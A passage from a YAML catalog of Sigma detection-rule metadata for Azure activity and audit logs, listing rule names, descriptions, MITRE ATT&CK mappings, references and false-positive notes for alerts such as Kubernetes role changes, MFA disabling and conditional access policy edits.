  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_kubernetes_pods_deleted.yml
  name: Azure Kubernetes Pods Deleted
  description: Identifies the deletion of Azure Kubernetes Pods.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes
  - https://github.com/elastic/detection-rules/blob/065bf48a9987cd8bd826c098a30ce36e6868ee46/rules/integrations/azure/impact_kubernetes_pod_deleted.toml
  false_positives:
  - Pods may be deleted by a system administrator. Verify whether the user identity,
    user agent, and/or hostname should be making changes in your environment.
  - Pods deletions from unfamiliar users or hosts should be investigated. If known
    behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 818fee0c-e0ec-4e45-824e-83e4817b0887
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_kubernetes_role_access.yml
  name: Azure Kubernetes Sensitive Role Access
  description: Identifies when ClusterRoles/Roles are being modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - risk_scoring_or_weighting
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  - T1489
  - T1496
  tags:
  - attack.impact
  - attack.t1485
  - attack.t1496
  - attack.t1489
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes
  - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/
  - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/
  - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1
  false_positives:
  - ClusterRoles/Roles being modified and deleted may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - ClusterRoles/Roles modification from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 25cb259b-bbdc-4b87-98b7-90d7c72f8743
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_kubernetes_rolebinding_modified_or_deleted.yml
  name: Azure Kubernetes RoleBinding/ClusterRoleBinding Modified and Deleted
  description: Detects the creation or patching of potential malicious RoleBinding/ClusterRoleBinding.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - risk_scoring_or_weighting
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  - T1489
  - T1496
  tags:
  - attack.impact
  - attack.credential-access
  - attack.t1485
  - attack.t1496
  - attack.t1489
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes
  - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/
  - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/
  - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1
  false_positives:
  - RoleBinding/ClusterRoleBinding being modified and deleted may be performed by
    a system administrator. Verify whether the user identity, user agent, and/or hostname
    should be making changes in your environment.
  - RoleBinding/ClusterRoleBinding modification from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 7ee0b4aa-d8d4-4088-b661-20efdf41a04c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_kubernetes_secret_or_config_object_access.yml
  name: Azure Kubernetes Secret or Config Object Access
  description: Identifies when a Kubernetes account access a sensitive objects such
    as configmaps or secrets.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  - T1489
  - T1496
  tags:
  - attack.impact
  - attack.t1485
  - attack.t1496
  - attack.t1489
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes
  - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/
  - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/
  - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1
  false_positives:
  - Sensitive objects may be accessed by a system administrator. Verify whether the
    user identity, user agent, and/or hostname should be making changes in your environment.
    Sensitive objects accessed from unfamiliar users should be investigated. If known
    behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 12d027c3-b48c-4d9d-8bb6-a732200034b2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_kubernetes_service_account_modified_or_deleted.yml
  name: Azure Kubernetes Service Account Modified or Deleted
  description: Identifies when a service account is modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1485
  - T1489
  - T1496
  - T1531
  tags:
  - attack.impact
  - attack.t1531
  - attack.t1485
  - attack.t1496
  - attack.t1489
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes
  - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/
  - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/
  - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1
  false_positives:
  - Service account being modified or deleted may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Service account modified or deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 7ea78478-a4f9-42a6-9dcd-f861816122bf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_mfa_disabled.yml
  name: Disabled MFA to Bypass Authentication Mechanisms
  description: Detection for when multi factor authentication has been disabled, which
    might indicate a malicious activity to bypass authentication mechanisms.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1556
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.persistence
  - attack.t1556
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/active-directory/authentication/howto-mfa-userstates
  false_positives:
  - Authorized modification by administrators
  notes: ''
- detection_id: 83c17918-746e-4bd9-920b-8e098bf88c23
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_network_firewall_policy_modified_or_deleted.yml
  name: Azure Network Firewall Policy Modified or Deleted
  description: Identifies when a Firewall Policy is Modified or Deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - multi_signal_correlation
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1562.007
  tags:
  - attack.impact
  - attack.defense-evasion
  - attack.t1562.007
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Firewall Policy being modified or deleted may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Firewall Policy modified or deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 2a7d64cf-81fa-4daf-ab1b-ab80b789c067
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_network_firewall_rule_modified_or_deleted.yml
  name: Azure Firewall Rule Configuration Modified or Deleted
  description: Identifies when a Firewall Rule Configuration is Modified or Deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Firewall Rule Configuration being modified or deleted may be performed by a system
    administrator. Verify whether the user identity, user agent, and/or hostname should
    be making changes in your environment.
  - Firewall Rule Configuration modified or deleted from unfamiliar users should be
    investigated. If known behavior is causing false positives, it can be exempted
    from the rule.
  notes: ''
- detection_id: d9557b75-267b-4b43-922f-a775e2d1f792
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_network_p2s_vpn_modified_or_deleted.yml
  name: Azure Point-to-site VPN Modified or Deleted
  description: Identifies when a Point-to-site VPN is Modified or Deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Point-to-site VPN being modified or deleted may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Point-to-site VPN modified or deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: d22b4df4-5a67-4859-a578-8c9a0b5af9df
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_network_security_modified_or_deleted.yml
  name: Azure Network Security Configuration Modified or Deleted
  description: Identifies when a network security configuration is modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - multi_signal_correlation
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Network Security Configuration being modified or deleted may be performed by a
    system administrator. Verify whether the user identity, user agent, and/or hostname
    should be making changes in your environment.
  - Network Security Configuration modified or deleted from unfamiliar users should
    be investigated. If known behavior is causing false positives, it can be exempted
    from the rule.
  notes: ''
- detection_id: 15ef3fac-f0f0-4dc4-ada0-660aa72980b3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_network_virtual_device_modified_or_deleted.yml
  name: Azure Virtual Network Device Modified or Deleted
  description: 'Identifies when a virtual network device is being modified or deleted.

    This can be a network interface, network virtual appliance, virtual hub, or virtual
    router.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - multi_signal_correlation
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Virtual Network Device being modified or deleted may be performed by a system
    administrator. Verify whether the user identity, user agent, and/or hostname should
    be making changes in your environment.
  - Virtual Network Device modified or deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 72af37e2-ec32-47dc-992b-bc288a2708cb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_new_cloudshell_created.yml
  name: Azure New CloudShell Created
  description: Identifies when a new cloudshell is created inside of Azure portal.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - A new cloudshell may be created by a system administrator.
  notes: ''
- detection_id: 636e30d5-3736-42ea-96b1-e6e2f8429fd6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_owner_removed_from_application_or_service_principal.yml
  name: Azure Owner Removed From Application or Service Principal
  description: Identifies when a owner is was removed from a application or service
    principal in Azure.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/reference-audit-activities#application-proxy
  false_positives:
  - Owner being removed may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Owner removed from unfamiliar users should be investigated. If known behavior
    is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: c1182e02-49a3-481c-b3de-0fadc4091488
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_rare_operations.yml
  name: Rare Subscription-level Operations In Azure
  description: Identifies IPs from which users grant access to other users on azure
    resources and alerts when a previously unseen source IP address is used.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003
  tags:
  - attack.t1003
  - attack.credential-access
  time_window: ''
  references:
  - https://github.com/Azure/Azure-Sentinel/blob/e534407884b1ec5371efc9f76ead282176c9e8bb/Detections/AzureActivity/RareOperations.yaml
  false_positives:
  - Valid change
  notes: ''
- detection_id: 0ddcff6d-d262-40b0-804b-80eb592de8e3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_service_principal_created.yml
  name: Azure Service Principal Created
  description: Identifies when a service principal is created in Azure.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/reference-audit-activities#application-proxy
  false_positives:
  - Service principal being created may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Service principal created from unfamiliar users should be investigated. If known
    behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 448fd1ea-2116-4c62-9cde-a92d120e0f08
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_service_principal_removed.yml
  name: Azure Service Principal Removed
  description: Identifies when a service principal was removed in Azure.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/identity/monitoring-health/reference-audit-activities#application-proxy
  false_positives:
  - Service principal being removed may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Service principal removed from unfamiliar users should be investigated. If known
    behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 09438caa-07b1-4870-8405-1dbafe3dad95
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_subscription_permissions_elevation_via_activitylogs.yml
  name: Azure Subscription Permission Elevation Via ActivityLogs
  description: 'Detects when a user has been elevated to manage all Azure Subscriptions.

    This change should be investigated immediately if it isn''t planned.

    This setting could allow an attacker access to Azure subscriptions in your environment.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftauthorization
  false_positives:
  - If this was approved by System Administrator.
  notes: ''
- detection_id: 92cc3e5d-eb57-419d-8c16-5c63f325a401
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_suppression_rule_created.yml
  name: Azure Suppression Rule Created
  description: Identifies when a suppression rule is created in Azure. Adversary's
    could attempt this to evade detection.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Suppression Rule being created may be performed by a system administrator.
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Suppression Rule created from unfamiliar users should be investigated. If known
    behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: bcfcc962-0e4a-4fd9-84bb-a833e672df3f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_virtual_network_modified_or_deleted.yml
  name: Azure Virtual Network Modified or Deleted
  description: Identifies when a Virtual Network is modified or deleted in Azure.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - Virtual Network being modified or deleted may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - Virtual Network modified or deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 61171ffc-d79c-4ae5-8e10-9323dba19cd3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/activity_logs/azure_vpn_connection_modified_or_deleted.yml
  name: Azure VPN Connection Modified or Deleted
  description: Identifies when a VPN connection is modified or deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: activitylogs
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations
  false_positives:
  - VPN Connection being modified or deleted may be performed by a system administrator.
    Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  - VPN Connection modified or deleted from unfamiliar users should be investigated.
    If known behavior is causing false positives, it can be exempted from the rule.
  notes: ''
- detection_id: 26e7c5e2-6545-481e-b7e6-050143459635
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_aad_secops_ca_policy_removedby_bad_actor.yml
  name: CA Policy Removed by Non Approved Actor
  description: Monitor and alert on conditional access changes where non approved
    actor removed CA Policy.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1548
  - T1556
  tags:
  - attack.privilege-escalation
  - attack.credential-access
  - attack.defense-evasion
  - attack.persistence
  - attack.t1548
  - attack.t1556
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-infrastructure#conditional-access
  false_positives:
  - Misconfigured role permissions
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  notes: ''
- detection_id: 50a3c7aa-ec29-44a4-92c1-fce229eef6fc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_aad_secops_ca_policy_updatedby_bad_actor.yml
  name: CA Policy Updated by Non Approved Actor
  description: Monitor and alert on conditional access changes. Is Initiated by (actor)
    approved to make changes? Review Modified Properties and compare "old" vs "new"
    value.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1548
  - T1556
  tags:
  - attack.privilege-escalation
  - attack.credential-access
  - attack.defense-evasion
  - attack.persistence
  - attack.t1548
  - attack.t1556
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-infrastructure#conditional-access
  false_positives:
  - Misconfigured role permissions
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  notes: ''
- detection_id: 0922467f-db53-4348-b7bf-dee8d0d348c6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_aad_secops_new_ca_policy_addedby_bad_actor.yml
  name: New CA Policy by Non-approved Actor
  description: Monitor and alert on conditional access changes.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1548
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-infrastructure
  false_positives:
  - Misconfigured role permissions
  - Verify whether the user identity, user agent, and/or hostname should be making
    changes in your environment.
  notes: ''
- detection_id: 6f583da0-3a90-4566-a4ed-83c09fe18bbf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_ad_account_created_deleted.yml
  name: Account Created And Deleted Within A Close Time Frame
  description: Detects when an account was created and deleted in a short period of
    time.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-user-accounts#short-lived-accounts
  false_positives:
  - Legit administrative action
  notes: ''
- detection_id: a0413867-daf3-43dd-9245-734b3a787942
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_ad_bitlocker_key_retrieval.yml
  name: Bitlocker Key Retrieval
  description: Monitor and alert for Bitlocker key retrieval.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.initial-access
  - attack.defense-evasion
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-devices#bitlocker-key-retrieval
  false_positives:
  - Unknown
  notes: ''
- detection_id: c2496b41-16a9-4016-a776-b23f8910dc58
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_ad_certificate_based_authencation_enabled.yml
  name: Certificate-Based Authentication Enabled
  description: Detects when certificate based authentication has been enabled in an
    Azure Active Directory tenant.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1556
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1556
  time_window: ''
  references:
  - https://posts.specterops.io/passwordless-persistence-and-privilege-escalation-in-azure-98a01310be3f
  - https://goodworkaround.com/2022/02/15/digging-into-azure-ad-certificate-based-authentication/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9494bff8-959f-4440-bbce-fb87a208d517
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_ad_device_registration_policy_changes.yml
  name: Changes to Device Registration Policy
  description: Monitor and alert for changes to the device registration policy.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1484
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1484
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-devices#device-registrations-and-joins-outside-policy
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4ad97bf5-a514-41a4-abd3-4f3455ad4865
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_ad_guest_users_invited_to_tenant_by_non_approved_inviters.yml
  name: Guest Users Invited To Tenant By Non Approved Inviters
  description: Detects guest users being invited to tenant by non-approved inviters
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078
  time_window: ''
  references:
  - https://learn.microsoft.com/en-gb/entra/architecture/security-operations-user-accounts#monitoring-external-user-sign-ins
  false_positives:
  - If this was approved by System Administrator.
  notes: ''
- detection_id: 4bb80281-3756-4ec8-a88e-523c5a6fda9e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_ad_new_root_ca_added.yml
  name: New Root Certificate Authority Added
  description: Detects newly added root certificate authority to an AzureAD tenant
    to support certificate based authentication.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 7
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1556
  tags:
  - attack.defense-evasion
  - attack.credential-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1556
  time_window: ''
  references:
  - https://posts.specterops.io/passwordless-persistence-and-privilege-escalation-in-azure-98a01310be3f
  - https://goodworkaround.com/2022/02/15/digging-into-azure-ad-certificate-based-authentication/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 11c767ae-500b-423b-bae3-b234450736ed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_ad_users_added_to_device_admin_roles.yml
  name: Users Added to Global or Device Admin Roles
  description: Monitor and alert for users added to device admin roles.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1078.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/entra/architecture/security-operations-devices#device-administrator-roles
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1b45b0d1-773f-4f23-aedc-814b759563b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/cloud/azure/audit_logs/azure_app_appid_uri_changes.yml
  name: Application AppID Uri Configuration Changes
  description: Detects when a configuration change is made to an applications AppID
    URI.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  - T1552
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.persistence
  - attack.credential-access
  - attack.privilege-escalation
  - attack.t1552
  - attack.t1078.004
  time_window: ''
  references:
